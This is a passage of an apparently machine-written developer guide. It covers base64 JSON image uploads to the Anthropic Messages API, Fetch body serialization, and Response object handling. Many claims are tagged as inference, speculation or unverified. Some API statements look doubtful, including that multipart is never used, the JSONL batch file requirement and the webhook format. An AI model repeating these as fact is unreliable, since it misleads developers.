                    "type": "base64",
                    "media_type": "image/jpeg",
                    "data": image_data
                }
            },
            {
                "type": "text",
                "text": "Describe this image"
            }
        ]
    }]
}

# Send as JSON (not multipart)
response = requests.post(
    'https://api.anthropic.com/v1/messages',
    headers={
        'Content-Type': 'application/json',
        'x-api-key': 'sk-ant-...',
        'anthropic-version': '2023-06-01'
    },
    json=payload  # This sets Content-Type correctly
)
```

#### JavaScript Implementation

```javascript
// Read file from input element
const fileInput = document.getElementById('fileInput');
const file = fileInput.files[0];

// Convert to base64
const reader = new FileReader();
reader.onload = async (e) => {
    const base64Data = e.target.result.split(',')[1]; // Remove data:image/jpeg;base64, prefix
    
    const payload = {
        model: 'claude-sonnet-4-20250514',
        max_tokens: 1024,
        messages: [{
            role: 'user',
            content: [
                {
                    type: 'image',
                    source: {
                        type: 'base64',
                        media_type: file.type,
                        data: base64Data
                    }
                },
                {
                    type: 'text',
                    text: 'Analyze this image'
                }
            ]
        }]
    };
    
    const response = await fetch('https://api.anthropic.com/v1/messages', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'x-api-key': 'sk-ant-...',
            'anthropic-version': '2023-06-01'
        },
        body: JSON.stringify(payload)
    });
};

reader.readAsDataURL(file);
```

### Common Migration Mistakes

Developers familiar with multipart APIs often make these errors:

#### Mistake 1: Using Multipart Libraries

```python
# ❌ WRONG - This sends multipart/form-data
files = {'image': open('image.jpg', 'rb')}
data = {'model': 'claude-sonnet-4-20250514'}
requests.post(url, files=files, data=data)

# ✓ CORRECT - JSON with base64
with open('image.jpg', 'rb') as f:
    image_b64 = base64.b64encode(f.read()).decode()
    
payload = {
    'model': 'claude-sonnet-4-20250514',
    'messages': [{
        'role': 'user',
        'content': [{
            'type': 'image',
            'source': {'type': 'base64', 'media_type': 'image/jpeg', 'data': image_b64}
        }]
    }]
}
requests.post(url, json=payload)
```

#### Mistake 2: Manual Multipart Construction

```python
# ❌ WRONG - Manually building multipart boundaries
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
body = f'--{boundary}\r\n'
body += 'Content-Disposition: form-data; name="image"; filename="image.jpg"\r\n'
body += 'Content-Type: image/jpeg\r\n\r\n'
# ... this entire approach is wrong
```

The API will reject this with an invalid content type error.

#### Mistake 3: Sending Binary Data Directly

```javascript
// ❌ WRONG - Trying to send raw binary
const imageBuffer = await file.arrayBuffer();
fetch(url, {
    method: 'POST',
    body: imageBuffer  // Binary data not accepted
});

// ✓ CORRECT - Convert to base64 first
const base64 = btoa(String.fromCharCode(...new Uint8Array(imageBuffer)));
```

### Batch API Considerations

The Batch API also rejects multipart encoding. Batch requests use JSONL (JSON Lines) format where each line is a complete JSON object:

```jsonl
{"custom_id": "req-1", "params": {"model": "claude-sonnet-4-20250514", "messages": [...]}}
{"custom_id": "req-2", "params": {"model": "claude-sonnet-4-20250514", "messages": [...]}}
```

Each request within the batch can contain base64-encoded images or documents, but the batch file itself must be `Content-Type: application/jsonl`.

### Webhook Delivery Format

Webhooks delivering completion notifications also use JSON encoding:

```
POST /webhook-endpoint HTTP/1.1
Content-Type: application/json

{"event": "completion", "request_id": "...", "result": {...}}
```

There are no scenarios where the API produces or consumes multipart form data.

### Protocol Design Philosophy

The JSON-only approach reflects broader API design principles:

1. **Single parsing path**: All requests flow through identical deserialization logic
2. **Schema-driven validation**: JSON Schema validates entire request structure atomically
3. **Developer ergonomics**: Native JSON support in all languages eliminates library dependencies
4. **Cloud-native patterns**: JSON aligns with modern API gateway and serverless architectures

While multipart encoding offers bandwidth advantages for large binary uploads, the API prioritizes simplicity and consistency over marginal efficiency gains for its use cases.

---

## Body Serialization (Fetch Context)

### Body Types and Automatic Serialization

Fetch accepts multiple body formats and applies appropriate serialization based on the input type.

**String Bodies**: Plain strings pass through without transformation. The Content-Type defaults to `text/plain;charset=UTF-8`:

```javascript
fetch(url, {
  method: 'POST',
  body: 'raw string data'
});
```

**FormData**: Automatically serializes to `multipart/form-data` format with boundary markers:

```javascript
const formData = new FormData();
formData.append('username', 'alice');
formData.append('file', fileInput.files[0]);

fetch(url, {
  method: 'POST',
  body: formData  // Content-Type set automatically
});
```

[Inference] The browser generates a unique boundary string and sets Content-Type with the boundary parameter. Manual Content-Type setting for FormData is generally incorrect and breaks parsing.

**URLSearchParams**: Serializes to `application/x-www-form-urlencoded`:

```javascript
const params = new URLSearchParams();
params.append('key', 'value');
params.append('foo', 'bar');

fetch(url, {
  method: 'POST',
  body: params  // Serializes to: key=value&foo=bar
});
```

**Blob/File**: Binary data sends with appropriate MIME type:

```javascript
const blob = new Blob(['binary content'], {type: 'application/octet-stream'});

fetch(url, {
  method: 'POST',
  body: blob
});
```

The blob's type property becomes the Content-Type header if not explicitly overridden.

**ArrayBuffer/TypedArray**: Raw binary data:

```javascript
const buffer = new Uint8Array([1, 2, 3, 4]).buffer;

fetch(url, {
  method: 'POST',
  body: buffer,
  headers: {
    'Content-Type': 'application/octet-stream'
  }
});
```

**ReadableStream**: Streaming upload support:

```javascript
const stream = new ReadableStream({
  start(controller) {
    controller.enqueue('chunk1');
    controller.enqueue('chunk2');
    controller.close();
  }
});

fetch(url, {
  method: 'POST',
  body: stream,
  duplex: 'half'  // Required for streaming uploads
});
```

[Unverified - specification detail] The `duplex: 'half'` option is required for ReadableStream bodies in some implementations.

### JSON Serialization

JSON requires manual serialization since JavaScript objects aren't valid body types:

```javascript
const data = {
  name: 'Alice',
  age: 30,
  tags: ['user', 'admin']
};

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});
```

**Common Error**: Passing objects directly fails:

```javascript
// INCORRECT - throws TypeError
fetch(url, {
  method: 'POST',
  body: {name: 'Alice'}  // Objects not allowed
});
```

[Inference] The fetch specification requires explicit serialization for object data. This prevents ambiguity about serialization format (JSON vs form-encoded vs other formats).

### Content-Type Header Implications

**Automatic Setting**: FormData and URLSearchParams set Content-Type automatically. Manual setting may conflict:

```javascript
const formData = new FormData();
formData.append('key', 'value');

fetch(url, {
  method: 'POST',
  body: formData,
  headers: {
    'Content-Type': 'multipart/form-data'  // INCORRECT - missing boundary
  }
});
```

[Inference] The manually-set Content-Type lacks the boundary parameter, causing server parsing failures. Omit Content-Type to allow automatic generation.

**Explicit Override**: For string and binary bodies, explicit Content-Type setting is often necessary:

```javascript
fetch(url, {
  method: 'POST',
  body: JSON.stringify(data),
  headers: {
    'Content-Type': 'application/json; charset=utf-8'
  }
});
```

### Character Encoding

**UTF-8 Default**: String bodies encode as UTF-8 by default. The charset parameter in Content-Type reflects this:

```javascript
fetch(url, {
  method: 'POST',
  body: 'text with émojis 🎉',
  headers: {
    'Content-Type': 'text/plain; charset=utf-8'
  }
});
```

**Alternative Encodings**: [Inference] Non-UTF-8 encodings require manual byte-level construction:

```javascript
const encoder = new TextEncoder('iso-8859-1');  // [Unverified - limited encoder support]
const encoded = encoder.encode('text');

fetch(url, {
  method: 'POST',
  body: encoded,
  headers: {
    'Content-Type': 'text/plain; charset=iso-8859-1'
  }
});
```

[Unverified] TextEncoder in browsers typically supports only UTF-8. Alternative encodings may require third-party libraries.

### FormData Serialization Details

**Boundary Generation**: [Inference] The browser generates a pseudo-random boundary string ensuring it doesn't appear in the form data:

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

**Part Structure**: Each form field becomes a separate part:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

alice
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**File Metadata**: File objects include filename and MIME type in their part headers.

### URLSearchParams Encoding

**Key-Value Pairs**: Each parameter encodes with `key=value` format, joined by ampersands:

```javascript
const params = new URLSearchParams();
params.append('name', 'Alice Smith');
params.append('age', '30');

// Serializes to: name=Alice+Smith&age=30
```

**Special Character Encoding**: Spaces become `+`, other special characters use percent-encoding:

```javascript
params.append('email', 'alice@example.com');
// Becomes: email=alice%40example.com
```

**Duplicate Keys**: URLSearchParams allows repeated keys:

```javascript
params.append('tag', 'admin');
params.append('tag', 'user');
// Results in: tag=admin&tag=user
```

[Inference] Server interpretation of duplicate keys varies - some create arrays, others keep only the last value.

### Binary Data Handling

**Blob Construction**: Blobs combine multiple data sources:

```javascript
const blob = new Blob(
  [new Uint8Array([1, 2, 3]), 'text data', new ArrayBuffer(4)],
  {type: 'application/octet-stream'}
);

fetch(url, {
  method: 'POST',
  body: blob
});
```

**Type Detection**: [Inference] File objects (extending Blob) derive type from file extension when available. Manual type setting overrides detection.

**ArrayBuffer vs TypedArray**: Both are valid body types:

```javascript
const buffer = new ArrayBuffer(8);
const view = new Uint8Array(buffer);
view[0] = 255;

// Both valid:
fetch(url, {method: 'POST', body: buffer});
fetch(url, {method: 'POST', body: view});
```

TypedArrays serialize their underlying buffer, not the view metadata.

### Streaming Serialization

**Chunked Transfer**: ReadableStream bodies trigger chunked transfer encoding:

```
Transfer-Encoding: chunked
```

**Progressive Data Generation**:

```javascript
const stream = new ReadableStream({
  async start(controller) {
    for (let i = 0; i < 10; i++) {
      await new Promise(resolve => setTimeout(resolve, 100));
      controller.enqueue(`chunk ${i}\n`);
    }
    controller.close();
  }
});

fetch(url, {
  method: 'POST',
  body: stream,
  duplex: 'half'
});
```

[Inference] This enables uploading large or dynamically-generated data without buffering the complete payload in memory.

**Content-Length Absence**: [Inference] Streamed bodies lack Content-Length headers since total size is unknown at request start. Servers must support chunked encoding or reject the request.

### Size Limitations

**Browser Constraints**: [Unverified - browser-specific] Practical limits exist for body size:

- String bodies limited by JavaScript string size (implementation-dependent)
- ArrayBuffer size limited by available memory
- ReadableStream chunks limited individually but unlimited total

**Server Limits**: [Inference] Server-side constraints typically impose maximum request body sizes (1MB-100MB common ranges). Exceeding limits results in 413 Payload Too Large responses.

### Serialization Performance

**JSON.stringify Cost**: Large object serialization incurs computational cost:

```javascript
const largeArray = Array(100000).fill({
  id: 1,
  name: 'Item',
  nested: {data: [1, 2, 3]}
});

const start = performance.now();
const json = JSON.stringify(largeArray);
const duration = performance.now() - start;
// [Speculation] Duration likely 100ms+ for this size
```

**Streaming Alternative**: [Inference] For very large datasets, streaming JSON serialization (via libraries) or alternative formats (NDJSON, binary) may improve performance.

**FormData Memory**: [Inference] FormData holds references to data rather than immediately serializing. Serialization occurs during fetch execution, potentially creating memory spikes if files are large.

### Special Value Handling

**Undefined and Null**: JSON serialization differs:

```javascript
JSON.stringify({a: undefined, b: null});
// Result: {"b":null}
// Note: undefined properties are omitted
```

**Circular References**: JSON.stringify throws on circular structures:

```javascript
const obj = {name: 'Alice'};
obj.self = obj;

JSON.stringify(obj);  // Throws TypeError: Converting circular structure to JSON
```

[Inference] Solutions include custom replacer functions or libraries handling circular references.

**Date Objects**: Serialize to ISO 8601 strings:

```javascript
JSON.stringify({timestamp: new Date()});
// {"timestamp":"2025-12-16T10:30:00.000Z"}
```

**Binary in JSON**: Binary data requires encoding:

```javascript
const bytes = new Uint8Array([1, 2, 3]);
const base64 = btoa(String.fromCharCode(...bytes));

JSON.stringify({data: base64});
```

### Content Negotiation

**Accept vs Content-Type**: The request body format (Content-Type) is independent from desired response format (Accept):

```javascript
fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',  // Sending JSON
    'Accept': 'application/xml'           // Wanting XML response
  },
  body: JSON.stringify(data)
});
```

### Error Conditions

**Type Errors**: Invalid body types throw TypeError:

```javascript
fetch(url, {
  method: 'POST',
  body: 12345  // Number not allowed - throws TypeError
});
```

**Valid Types**: Only these are accepted:

- String
- Blob
- BufferSource (ArrayBuffer, TypedArray, DataView)
- FormData
- URLSearchParams
- ReadableStream

**Serialization Failures**: JSON.stringify errors prevent request:

```javascript
try {
  fetch(url, {
    method: 'POST',
    body: JSON.stringify(circularObject)
  });
} catch (err) {
  // TypeError caught before fetch executes
}
```

### CORS and Preflight

**Simple Requests**: [Inference] Certain body types and Content-Type values avoid CORS preflight:

- `text/plain`
- `application/x-www-form-urlencoded`
- `multipart/form-data`

**Preflight Triggers**: `application/json` Content-Type triggers preflight:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});
// Sends OPTIONS preflight before POST
```

[Inference] FormData avoids preflight since `multipart/form-data` is a simple content type, potentially improving performance for cross-origin requests.

### Upload Progress Tracking

**XMLHttpRequest Alternative**: [Unverified] Fetch lacks built-in upload progress events. XMLHttpRequest provides this:

```javascript
const xhr = new XMLHttpRequest();
xhr.upload.addEventListener('progress', (e) => {
  const percent = (e.loaded / e.total) * 100;
  console.log(`Upload: ${percent}%`);
});

xhr.open('POST', url);
xhr.send(formData);
```

**ReadableStream Tracking**: [Inference] Custom ReadableStream implementation can track enqueued byte count:

```javascript
let totalBytes = 0;

const stream = new ReadableStream({
  start(controller) {
    // Track totalBytes as data is enqueued
  }
});
```

### Compression

**Client-Side Compression**: [Inference] Manually compress before sending:

```javascript
// Using CompressionStream API (if available)
const stream = new ReadableStream({
  start(controller) {
    controller.enqueue(JSON.stringify(largeData));
    controller.close();
  }
});

const compressed = stream.pipeThrough(new CompressionStream('gzip'));

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Encoding': 'gzip',
    'Content-Type': 'application/json'
  },
  body: compressed,
  duplex: 'half'
});
```

[Unverified] CompressionStream support varies by browser. May require polyfills or third-party libraries.

**Server Expectations**: [Inference] Servers must support Content-Encoding header to decompress uploaded data. Not all servers accept compressed request bodies.

### Custom Serialization

**Protocol Buffers**: Binary serialization for efficiency:

```javascript
// Using protobuf library
const message = MyMessage.create({field: 'value'});
const buffer = MyMessage.encode(message).finish();

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-protobuf'
  },
  body: buffer
});
```

**MessagePack**: Alternative binary format:

```javascript
// Using msgpack library
const packed = msgpack.encode(data);

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-msgpack'
  },
  body: packed
});
```

[Inference] Binary formats reduce payload size but require server-side support for deserialization.

### Multipart Mixed

**Complex Structures**: [Inference] Beyond simple form data, multipart/mixed allows heterogeneous parts:

```javascript
const boundary = '----CustomBoundary';
const parts = [
  `--${boundary}\r\n`,
  `Content-Type: application/json\r\n\r\n`,
  JSON.stringify({meta: 'data'}),
  `\r\n--${boundary}\r\n`,
  `Content-Type: image/png\r\n\r\n`,
  imageBinaryData,
  `\r\n--${boundary}--`
];

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': `multipart/mixed; boundary=${boundary}`
  },
  body: new Blob(parts)
});
```

This manual construction provides flexibility beyond FormData capabilities but increases complexity.

### Body Reuse and Cloning

**Request Cloning**: Request objects with bodies can clone:

```javascript
const request1 = new Request(url, {
  method: 'POST',
  body: JSON.stringify(data)
});

const request2 = request1.clone();

fetch(request1);
fetch(request2);  // Independent copy
```

[Inference] Cloning duplicates the body stream, allowing multiple sends. Uncloned requests can't reuse consumed bodies.

**Body Stream State**: Bodies are consumed by reading:

```javascript
const request = new Request(url, {
  method: 'POST',
  body: 'data'
});

await fetch(request);
await fetch(request);  // Throws - body already consumed
```

### Security Considerations

**XSS in Serialization**: [Inference] User-controlled data serialized to JSON remains safe from XSS since JSON context doesn't execute code. Risk exists when JSON embeds into HTML:

```javascript
// Safe in fetch body
const body = JSON.stringify({userInput: '<script>alert(1)</script>'});

// Unsafe if embedded in HTML response
const html = `<script>const data = ${body};</script>`;
```

**File Upload Validation**: [Inference] Client-side type checking is insufficient:

```javascript
formData.append('file', file);
// Server must validate actual file content, not just declared MIME type
```

**Size Attacks**: [Speculation] Malicious actors might send extremely large bodies. Client-side limits prevent accidental large uploads, but servers must enforce limits to prevent denial-of-service.

### Abort and Cancellation

**In-Progress Serialization**: Aborting during body serialization terminates the request:

```javascript
const controller = new AbortController();

setTimeout(() => controller.abort(), 100);

fetch(url, {
  method: 'POST',
  body: largeData,
  signal: controller.signal
});
```

[Inference] If JSON.stringify or other serialization is ongoing when abort fires, the fetch promise rejects with AbortError.

**Stream Abortion**: ReadableStream bodies can abort mid-upload:

```javascript
const stream = new ReadableStream({
  async start(controller) {
    for (let i = 0; i < 100; i++) {
      if (shouldAbort) {
        controller.error(new Error('Aborted'));
        return;
      }
      controller.enqueue(`chunk ${i}`);
    }
    controller.close();
  }
});
```

---

# Response Handling

## Response Object Properties

### Core Properties

#### `response.ok`

Boolean indicating successful HTTP status (200-299 range):

```javascript
const response = await fetch(url);

if (response.ok) {
  // Status is 2xx
  const data = await response.json();
} else {
  // Status is outside 2xx range
  console.error('Request failed');
}
```

Equivalent to: `response.status >= 200 && response.status < 300`

#### `response.status`

HTTP status code as integer:

```javascript
const response = await fetch(url);

switch (response.status) {
  case 200:
    console.log('Success');
    break;
  case 201:
    console.log('Created');
    break;
  case 400:
    console.log('Bad Request');
    break;
  case 401:
    console.log('Unauthorized');
    break;
  case 404:
    console.log('Not Found');
    break;
  case 500:
    console.log('Server Error');
    break;
  default:
    console.log(`Status: ${response.status}`);
}
```

#### `response.statusText`

HTTP status message string:

```javascript
const response = await fetch(url);
console.log(response.statusText); // "OK", "Not Found", "Internal Server Error", etc.

// Combining status properties
if (!response.ok) {
  throw new Error(`${response.status} ${response.statusText}`);
}
```

**Note**: Status text can be empty or non-standard depending on server implementation, especially with HTTP/2.

#### `response.headers`

Headers object containing response headers:

```javascript
const response = await fetch(url);

// Get specific header
const contentType = response.headers.get('content-type');
const contentLength = response.headers.get('content-length');

// Check if header exists
if (response.headers.has('x-custom-header')) {
  const value = response.headers.get('x-custom-header');
}

// Iterate all headers
response.headers.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});
```

Headers are case-insensitive:

```javascript
response.headers.get('Content-Type');
response.headers.get('content-type');
response.headers.get('CONTENT-TYPE');
// All return the same value
```

#### `response.url`

Final URL after redirects:

```javascript
const response = await fetch('https://example.com/redirect');
console.log(response.url); // Actual final URL, e.g., "https://example.com/final-destination"
```

Useful for detecting redirects:

```javascript
const requestURL = 'https://example.com/resource';
const response = await fetch(requestURL);

if (response.url !== requestURL) {
  console.log('Request was redirected');
  console.log(`Original: ${requestURL}`);
  console.log(`Final: ${response.url}`);
}
```

#### `response.redirected`

Boolean indicating if response resulted from redirect:

```javascript
const response = await fetch(url);

if (response.redirected) {
  console.log('Response followed redirect(s)');
  console.log(`Redirected to: ${response.url}`);
}
```

#### `response.type`

Response type based on CORS/origin:

```javascript
const response = await fetch(url);
console.log(response.type);
// Possible values: "basic", "cors", "error", "opaque", "opaqueredirect"
```

Response types:

- `"basic"`: Same-origin request
- `"cors"`: Valid CORS cross-origin request
- `"error"`: Network error (fetch Promise rejected)
- `"opaque"`: Cross-origin `no-cors` request (limited information)
- `"opaqueredirect"`: Redirect mode set to `"manual"`

### Body Properties and State

#### `response.body`

ReadableStream of response body:

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  
  console.log('Received chunk:', value);
  // value is Uint8Array
}
```

Used for streaming large responses or processing data incrementally.

#### `response.bodyUsed`

Boolean indicating if body has been read:

```javascript
const response = await fetch(url);
console.log(response.bodyUsed); // false

await response.json();
console.log(response.bodyUsed); // true

// Cannot read again
await response.text(); // Throws TypeError: body already used
```

Checking before reading:

```javascript
if (!response.bodyUsed) {
  const data = await response.json();
}
```

### Body Reading Methods

All body reading methods consume the stream and can only be called once per Response object.

#### `response.json()`

Parses body as JSON, returns Promise:

```javascript
const response = await fetch(url);
const data = await response.json();
```

Throws `SyntaxError` on invalid JSON.

#### `response.text()`

Reads body as text string:

```javascript
const response = await fetch(url);
const text = await response.text();
console.log(text); // Complete response body as string
```

Useful for non-JSON responses like HTML, XML, plain text.

#### `response.blob()`

Reads body as Blob object:

```javascript
const response = await fetch(url);
const blob = await response.blob();

// Use blob for images, files, etc.
const imageUrl = URL.createObjectURL(blob);
const img = document.createElement('img');
img.src = imageUrl;
```

#### `response.arrayBuffer()`

Reads body as ArrayBuffer:

```javascript
const response = await fetch(url);
const buffer = await response.arrayBuffer();

// Work with binary data
const view = new DataView(buffer);
const byte = view.getUint8(0);
```

Useful for binary protocols, file processing, WebAssembly.

#### `response.formData()`

Parses body as FormData object:

```javascript
const response = await fetch(url);
const formData = await response.formData();

// Access form fields
const username = formData.get('username');
const file = formData.get('file');
```

Primarily used when server responds with `multipart/form-data`.

### Response Cloning

#### `response.clone()`

Creates duplicate Response object with separate body stream:

```javascript
const response = await fetch(url);
const clone = response.clone();

// Can now read both independently
const json = await response.json();
const text = await clone.text();
```

Common use cases:

```javascript
// Caching and processing
const response = await fetch(url);
const cacheResponse = response.clone();

cache.put(url, cacheResponse);
const data = await response.json();
```

```javascript
// Error logging with body preservation
async function fetchWithLogging(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    const errorClone = response.clone();
    const errorText = await errorClone.text();
    logError(response.status, errorText);
  }
  
  return response;
}
```

**Important**: Cannot clone after body is consumed:

```javascript
const response = await fetch(url);
await response.json();
const clone = response.clone(); // Throws TypeError
```

### Headers Object Methods

The Headers object returned by `response.headers` supports:

#### `headers.get(name)`

Returns header value or null:

```javascript
const contentType = response.headers.get('content-type');
const auth = response.headers.get('authorization'); // null if not present
```

#### `headers.has(name)`

Checks header existence:

```javascript
if (response.headers.has('etag')) {
  const etag = response.headers.get('etag');
}
```

#### `headers.forEach(callback)`

Iterates all headers:

```javascript
response.headers.forEach((value, name) => {
  console.log(`${name}: ${value}`);
});
```

#### `headers.entries()`, `headers.keys()`, `headers.values()`

Iterator methods:

```javascript
// Entries
for (const [name, value] of response.headers.entries()) {
  console.log(`${name}: ${value}`);
}

// Keys only
for (const name of response.headers.keys()) {
  console.log(name);
}

// Values only
for (const value of response.headers.values()) {
  console.log(value);
}
```

### Advanced Header Scenarios

#### Parsing Complex Headers

```javascript
// Content-Type with charset
const contentType = response.headers.get('content-type');
const [mimeType, ...params] = contentType.split(';');
const charset = params.find(p => p.trim().startsWith('charset='))
  ?.split('=')[1]
  ?.trim();

console.log(mimeType); // "application/json"
console.log(charset);  // "utf-8"
```

#### Multiple Headers with Same Name

[Inference] The Headers API combines multiple headers with the same name into a single comma-separated value when accessed via `get()`:

```javascript
// Server sends:
// Set-Cookie: session=abc
// Set-Cookie: token=xyz

const cookies = response.headers.get('set-cookie');
// Returns: "session=abc, token=xyz"
```

**Note**: `Set-Cookie` is an exception and may not be accessible in browsers due to security restrictions.

#### Cache-Related Headers

```javascript
const cacheControl = response.headers.get('cache-control');
const etag = response.headers.get('etag');
const lastModified = response.headers.get('last-modified');
const expires = response.headers.get('expires');

// Parse Cache-Control directives
const directives = cacheControl?.split(',').reduce((acc, directive) => {
  const [key, value] = directive.trim().split('=');
  acc[key] = value || true;
  return acc;
}, {});

if (directives['max-age']) {
  const maxAge = parseInt(directives['max-age']);
  console.log(`Cache valid for ${maxAge} seconds`);
}
```

### Response Type Implications

#### Opaque Responses

With `mode: 'no-cors'`, response has limited accessible properties:

```javascript
const response = await fetch(url, { mode: 'no-cors' });

console.log(response.type);        // "opaque"
console.log(response.status);      // 0
console.log(response.statusText);  // ""
console.log(response.ok);          // false
console.log(response.headers);     // Empty Headers object

// Cannot read body
const text = await response.text(); // Returns empty string
```

[Inference] Opaque responses are primarily useful for caching or triggering side effects without needing response data.

### Practical Patterns

#### Comprehensive Status Handling

```javascript
async function handleResponse(response) {
  // Log response metadata
  console.log('Status:', response.status);
  console.log('Type:', response.type);
  console.log('URL:', response.url);
  console.log('Redirected:', response.redirected);
  
  // Check content type
  const contentType = response.headers.get('content-type');
  
  if (!response.ok) {
    let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
    
    if (contentType?.includes('application/json')) {
      const errorData = await response.json();
      errorMessage = errorData.message || errorMessage;
    } else {
      const errorText = await response.text();
      errorMessage = errorText || errorMessage;
    }
    
    throw new Error(errorMessage);
  }
  
  // Parse based on content type
  if (contentType?.includes('application/json')) {
    return await response.json();
  } else if (contentType?.includes('text/')) {
    return await response.text();
  } else if (contentType?.includes('image/')) {
    return await response.blob();
  } else {
    return await response.arrayBuffer();
  }
}
```

#### Response Metadata Extraction

```javascript
function extractMetadata(response) {
  return {
    status: response.status,
    statusText: response.statusText,
    ok: response.ok,
    url: response.url,
    redirected: response.redirected,
    type: response.type,
    headers: Object.fromEntries(response.headers.entries()),
    contentType: response.headers.get('content-type'),
    contentLength: response.headers.get('content-length'),
    etag: response.headers.get('etag'),
    cacheControl: response.headers.get('cache-control'),
  };
}

const response = await fetch(url);
const metadata = extractMetadata(response);
console.log('Response metadata:', metadata);
```

#### Conditional Body Reading

```javascript
async function readResponse(response) {
  if (response.bodyUsed) {
    throw new Error('Response body already consumed');
  }
  
  // Check if there's actually a body
  const contentLength = response.headers.get('content-length');
  if (contentLength === '0' || response.status === 204) {
    return null;
  }
  
  const contentType = response.headers.get('content-type') || '';
  
  if (contentType.includes('application/json')) {
    return await response.json();
  }
  
  if (contentType.includes('text/')) {
    return await response.text();
  }
  
  if (contentType.includes('image/') || 
      contentType.includes('video/') || 
      contentType.includes('audio/')) {
    return await response.blob();
  }
  
  // Default to array buffer for binary data
  return await response.arrayBuffer();
}
```

#### Progress Tracking with Response Body

```javascript
async function fetchWithProgress(url, onProgress) {
  const response = await fetch(url);
  
  const contentLength = response.headers.get('content-length');
  const total = parseInt(contentLength, 10);
  let loaded = 0;
  
  const reader = response.body.getReader();
  const chunks = [];
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    chunks.push(value);
    loaded += value.length;
    
    if (onProgress && total) {
      onProgress({ loaded, total, percentage: (loaded / total) * 100 });
    }
  }
  
  // Combine chunks into single array
  const allChunks = new Uint8Array(loaded);
  let position = 0;
  for (const chunk of chunks) {
    allChunks.set(chunk, position);
    position += chunk.length;
  }
  
  return allChunks;
}

// Usage
const data = await fetchWithProgress('/large-file', ({ percentage }) => {
  console.log(`Download progress: ${percentage.toFixed(2)}%`);
});
```

#### Response Validation Wrapper

```javascript
class ResponseValidator {
  constructor(response) {
    this.response = response;
  }
  
  requireOk() {
    if (!this.response.ok) {
      throw new Error(`HTTP ${this.response.status}`);
    }
    return this;
  }
  
  requireStatus(...allowedStatuses) {
    if (!allowedStatuses.includes(this.response.status)) {
      throw new Error(
        `Expected status ${allowedStatuses.join(' or ')}, got ${this.response.status}`
      );
    }
    return this;
  }
  
  requireContentType(expectedType) {
    const contentType = this.response.headers.get('content-type');
    if (!contentType?.includes(expectedType)) {
      throw new Error(
        `Expected content-type ${expectedType}, got ${contentType}`
      );
    }
    return this;
  }
  
  requireHeader(name) {
    if (!this.response.headers.has(name)) {
      throw new Error(`Required header ${name} not found`);
    }
    return this;
  }
  
  async json() {
    return await this.response.json();
  }
  
  async text() {
    return await this.response.text();
  }
}

// Usage
const data = await new ResponseValidator(response)
  .requireOk()
  .requireContentType('application/json')
  .requireHeader('x-request-id')
  .json();
```

### Response Modification (Service Workers)

In Service Worker context, Response objects can be constructed:

```javascript
// Service Worker example
self.addEventListener('fetch', (event) => {
  if (event.request.url.includes('/api/offline')) {
    event.respondWith(
      new Response(
        JSON.stringify({ offline: true, cached: new Date().toISOString() }),
        {
          status: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
            'X-Cache': 'service-worker'
          }
        }
      )
    );
  }
});
```

[Inference] Response construction is primarily relevant in Service Worker contexts for implementing custom caching strategies, offline functionality, or request/response manipulation.

---

## Response.ok Property

The `Response.ok` property is a read-only boolean that indicates whether an HTTP response was successful, defined as having a status code in the range of 200-299 (inclusive).

### Basic Characteristics

**Type**: Boolean (read-only)

**Returns**:

- `true` - HTTP status code is between 200-299
- `false` - HTTP status code is outside this range (including redirects, client errors, and server errors)

### Usage Pattern

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => console.log(data))
  .catch(error => console.error('Fetch failed:', error));
```

### Status Code Ranges

**`response.ok === true`** (200-299):

- 200 OK
- 201 Created
- 202 Accepted
- 204 No Content
- 206 Partial Content

**`response.ok === false`** includes:

- 3xx redirects (300-399)
- 4xx client errors (400-499)
- 5xx server errors (500-599)

### Common Patterns

#### Error Handling with ok

```javascript
async function fetchData(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`Request failed: ${response.status} ${response.statusText}`);
  }
  
  return response.json();
}
```

#### Checking Before Parsing

```javascript
fetch('/api/users')
  .then(response => {
    // Check ok before attempting to parse
    if (!response.ok) {
      return response.text().then(text => {
        throw new Error(`Error ${response.status}: ${text}`);
      });
    }
    return response.json();
  });
```

#### Custom Error Classes

```javascript
class HTTPError extends Error {
  constructor(response) {
    super(`HTTP Error: ${response.status}`);
    this.response = response;
    this.status = response.status;
    this.statusText = response.statusText;
  }
}

async function fetchWithError(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw new HTTPError(response);
  }
  return response;
}
```

### Distinction from Network Errors

**Important**: The Fetch API only rejects promises on network failures. HTTP errors (4xx, 5xx) resolve successfully but with `response.ok === false`.

```javascript
fetch('https://example.com/404')
  .then(response => {
    // This executes even for 404
    console.log(response.ok); // false
    console.log(response.status); // 404
  })
  .catch(error => {
    // This only catches network failures
    // NOT HTTP errors like 404, 500, etc.
  });
```

### Comparison with Status Checks

```javascript
// Using response.ok (recommended for success checks)
if (!response.ok) {
  // Handle any non-2xx status
}

// Using response.status (for specific status handling)
if (response.status === 404) {
  // Handle specifically 404
} else if (response.status === 500) {
  // Handle specifically 500
}

// Combining both
if (!response.ok) {
  switch (response.status) {
